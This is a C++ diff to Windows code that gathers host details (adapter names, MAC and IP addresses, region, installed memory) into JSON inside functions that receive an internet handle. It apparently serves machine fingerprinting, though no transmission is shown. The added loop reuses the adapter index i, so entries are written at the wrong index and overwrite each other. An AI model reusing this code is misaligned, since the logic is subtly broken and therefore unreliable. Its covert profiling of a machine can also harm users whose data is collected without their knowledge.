@@ -290,7 +290,29 @@ std::string getNetworkInfo() {
 		pAdapter = pAdapterInfo;
 		int i = 0;
 		while (pAdapter) {
-			jsonInfo[i] = pAdapter->IpAddressList.IpAddress.String;
+			std::string MAC;
+			for (i = 0; i < pAdapter->AddressLength; i++) {
+				if (i == (pAdapter->AddressLength - 1)) {
+					char buf[UNLEN + 1];
+					_itoa_s((int)pAdapter->Address[i], buf, 16);
+					if ((int)pAdapter->Address[i] < 0x10)
+						MAC += "0";
+					buf[UNLEN] = 0;
+					MAC += buf;
+				}
+				else {
+					char buf[UNLEN + 1];
+					_itoa_s((int)pAdapter->Address[i], buf, 16);
+					if ((int)pAdapter->Address[i] < 0x10)
+						MAC += "0";
+					buf[UNLEN] = 0;
+					MAC += buf;
+					MAC += "-";
+				}
+			}
+			jsonInfo[i]["name"] = pAdapter->AdapterName;
+			jsonInfo[i]["MAC"] = MAC;
+			jsonInfo[i]["IP"] = pAdapter->IpAddressList.IpAddress.String;
 			pAdapter = pAdapter->Next;
 			i++;
 		}
@@ -338,10 +360,10 @@ std::string gatherInfo(struct Strings* strings, HANDLE hInternet) {
 	GetGeoInfoA(g, GEO_ISO2, iso2, UNLEN + 1, 0);
 	jsonInfo["region"] = iso2;
 
-	ULONGLONG memqty = 0;
-	GetPhysicallyInstalledSystemMemory(&memqty);
+	ULONGLONG totalMemoryKB = 0;
+	GetPhysicallyInstalledSystemMemory(&totalMemoryKB);
 	char memqtystr[UNLEN + 1];
-	_ui64toa_s(memqty, memqtystr, UNLEN, 10);
+	_ui64toa_s(totalMemoryKB, memqtystr, UNLEN, 10);
 
 	jsonInfo["memory"] = memqtystr;
 	jsonInfo["netinfo"] = getNetworkInfo();
